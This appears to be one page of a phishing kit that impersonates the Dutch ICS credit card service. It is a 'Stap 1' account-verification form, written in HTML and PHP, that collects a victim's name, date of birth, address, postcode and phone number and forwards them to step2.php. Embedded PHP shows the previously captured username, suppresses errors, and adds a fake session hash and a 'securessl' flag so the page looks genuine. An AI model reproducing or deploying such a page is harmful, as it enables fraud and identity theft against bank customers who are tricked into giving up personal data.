<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html lang="nl" xml:lang="nl" xmlns="http://www.w3.org/1999/xhtml" class="win chrome chrome5 webkit webkit5"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style></style>

<title>Acount Verifiëren - Stap 1</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="stylesheet" type="text/css" href="./step1_files/reset.css">
<link rel="stylesheet" type="text/css" href="./step1_files/structure.css">
<link rel="stylesheet" type="text/css" href="./step1_files/components.css">
<link rel="stylesheet" type="text/css" href="./step1_files/jquery.keypad.css">
<link rel="stylesheet" type="text/css" href="./step1_files/jquery.keypad.css">
<link rel="stylesheet" type="text/css" href="./step1_files/js-enabled.css">
<script src="./login_files/modal.js"></script>
<!--[if IE 7]><link href="/theme/ics/style/ie7-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<!--[if IE 8]><link href="/theme/ics/style/ie8-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<!--[if IE 9]><link href="/theme/ics/style/ie9-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<style type="text/css">@import url(./step1_files/import.css);</style>
<script>
function empty() {
    var x;
    x = document.getElementById("first_name").value;
    if (x == "") {
        MsgBox('U voornaam is verplicht.', 'ERROR');
        return false;
    };
	var y;
    y = document.getElementById("last_name").value;
    if (y == "") {
        MsgBox('U achternaam is verplicht.', 'ERROR');
        return false;
    }
	var a;
    a = document.getElementById("dob_day").value;
    if (a == "") {
        MsgBox('Datum is verplicht.', 'ERROR');
        return false;
    }
	var b;
    b = document.getElementById("dob_month").value;
    if (b == "") {
        MsgBox('Maand is verplicht.', 'ERROR');
        return false;
    }
	var c;
    c = document.getElementById("dob_year").value;
    if (c == "") {
        MsgBox('Jaar is verplicht.', 'ERROR');
        return false;
    }
	var d;
    d = document.getElementById("address").value;
    if (d == "") {
        MsgBox('U adres is verplicht.', 'ERROR');
        return false;
    }
	var e;
    e = document.getElementById("town").value;
    if (e == "") {
        MsgBox('U stad is verplicht.', 'ERROR');
        return false;
    }
	var f;
    f = document.getElementById("postal_code").value;
    if (f == "") {
        MsgBox('U postcode is verplicht.', 'ERROR');
        return false;
    }
	var g;
    g = document.getElementById("phone_number").value;
    if (g == "") {
        MsgBox('U telefoonnummer is verplicht.', 'ERROR');
        return false;
    }
}
</script>
</head>
<body class="ics">
<div id="PageContainer">
<div class="RowContainer">

<div class="clear"><div id="Header"><div class="header-block"><div class="logo-block"><img alt="Logo voor afdruk-weergave" src="./step1_files/logo-ics.gif" class="print"><a href="" title=""><strong></strong></a></div></div><div id="Navigation" class="navigation-block"><strong class="text-only">Pagina navigatie:</strong><ul><li id="nav-00"><a href=""><span>Home</span></a></li><li id="nav-01"><a href=""><span>Producten</span></a></li><li id="nav-02"><a href=""><span>Aanbiedingen</span></a></li><li id="nav-03"><a href=""><span>Klantenservice</span></a></li><li id="nav-05"><a id="nav-login" href=""><span>Mijn ICS</span></a></li></ul><form enctype="text/plain" method="get" action=""><fieldset><legend>Zoeken</legend><label for="searchString" class="text-only">Uw vraag in minimaal 2 woorden</label><input maxlength="128" class="text-field label-value remove-value no-focus" name="searchString" id="searchString" type="text"><input class="button-submit" value="" name="search-header" id="search-header" type="submit" formnovalidate="formnovalidate"></fieldset></form></div></div>
</div>
<div class="RowContainer">
<div class="col maincontent">
<div class="form-block">
<div class="form-container">
<h1>Stap 1 - Persoonlijke informatie voor "<strong><?php error_reporting(0); session_start(); if(isset($_SESSION['username']))  { echo $_SESSION['username']; } ?></strong>"</h1>
<form id="enrollment" action="step2.php?&sessionid=<?php $v_ip = $_SERVER['REMOTE_ADDR']; $hash = md5($v_ip); echo $hash; ?>&securessl=true" method="post" onsubmit="return empty();">
<p><strong class="obligatory">*</strong> Deze velden zijn verplicht.</p><br><br><br>
<fieldset>
<div>
<label for="embossingName">Voornaam:
<strong class="obligatory">*</strong></label>
<input name="first_name" id="first_name" class="text-field L alphanumeric-custom" tabindex="3" type="text" value="" maxlength="35" autocomplete="off"></div><br>
<div>
<label for="embossingName">Achternaam:
<strong class="obligatory">*</strong></label>
<input name="last_name" id="last_name" class="text-field L alphanumeric-custom" tabindex="3" type="text" value="" maxlength="35" autocomplete="off"></div><br>
<div>
<label for="expiryMonth">Geboortedatum ( dd/mm/jjjj ):
<strong class="obligatory">*</strong></label>

<label class="text-only">dd</label><input id="dob_day" name="dob_day" class="text-field numeric XXS label-value remove-value default-value no-focus" tabindex="2" type="text" value="" maxlength="2" autocomplete="off"></div>
<div class="dateInputSeparator">/</div>
<div>
<label class="text-only">mm</label><input id="dob_month" name="dob_month" class="text-field numeric XXS label-value remove-value default-value no-focus" tabindex="3" type="text" value="" maxlength="2" autocomplete="off"></div>
<div class="dateInputSeparator">/</div>
<label class="text-only">jjjj</label><input id="dob_year" name="dob_year" class="text-field numeric XXS label-value remove-value default-value no-focus" tabindex="3" type="text" value="" maxlength="4" autocomplete="off" style="width: 35px;"><br>
<div>
<label for="embossingName">Adres:
<strong class="obligatory">*</strong></label>
<input name="address" id="address" class="text-field L alphanumeric-custom" tabindex="3" type="text" value="" maxlength="40" autocomplete="off"></div><br>
<div>
<label for="embossingName">Stad:
<strong class="obligatory">*</strong></label>
<input name="town" id="town" class="text-field L alphanumeric-custom" tabindex="3" type="text" value="" maxlength="25" autocomplete="off"></div><br>
<div>
<label for="embossingName">Postcode:
<strong class="obligatory">*</strong></label>
<input name="postal_code" id="postal_code" class="text-field L alphanumeric-custom" tabindex="3" type="text" value="" maxlength="15" autocomplete="off" style="width: 80px;"></div><br>
<div>
<label for="embossingName">Telefoonnummer:
<strong class="obligatory">*</strong></label>
<input name="phone_number" id="phone_number" class="text-field L alphanumeric-custom" tabindex="3" type="text" value="" maxlength="15" autocomplete="off" style="width: 120px;"></div><br>
<br><br><br>
</fieldset>
<fieldset class="form-buttons"><div class="button-submit"><input type="submit" id="finish" name="_finish" value="Doorgaan" tabindex="8" class=""></div></fieldset>
</form>
</div>
</div>
</div>
<div class="col sidebar">
<div class="container">
<div class="row">
<div class="col" style="width:44px;">

</div>
</div>
<div class="row">
<div class="col" style="width:260px;"><div class="login-block"><div class="inner"><h2>Mijn ICS</h2><div class="linklist-block"><ul><li><a href="">Activeren online omgeving</a></li><li><a href="">Meer weten over Mijn ICS</a></li><li class="link-more"><a href="">Inloggegevens vergeten?</a></li></ul></div><div class="login"><span><a name="button_inloggen" href=""><span>Inloggen</span></a></span></div></div></div></div>
</div>
</div>
</div>
</div>
<div class="RowContainer">
<div id="footerlinks-block">
<div class="footerlinks-block"><a class="usp-campagne" href=""><img src="./step1_files/usp_banner.png"></a><strong class="text-only">Algemene links:</strong><ul style="width:990px;margin-top: 0;"><li><span><a title="" href="">Over ICS</a></span></li><li><span><a title="" href="">Contact</a></span></li><li><span><a title="" href="">Privacy Statement</a></span></li><li><span><a title="Cookies instellen" href="">Cookies</a></span></li><li><span><a title="" href="">Disclaimer</a></span></li><li><span><a title="" href="">Algemene Voorwaarden</a></span></li><li><span><a title="Zakelijke Cards" href="" target="_blank">Zakelijke Cards</a></span></li><li><span><a title="" href="">Pers</a></span></li></ul><p></p></div>

</div>
</div>
</div>


</div></body></html>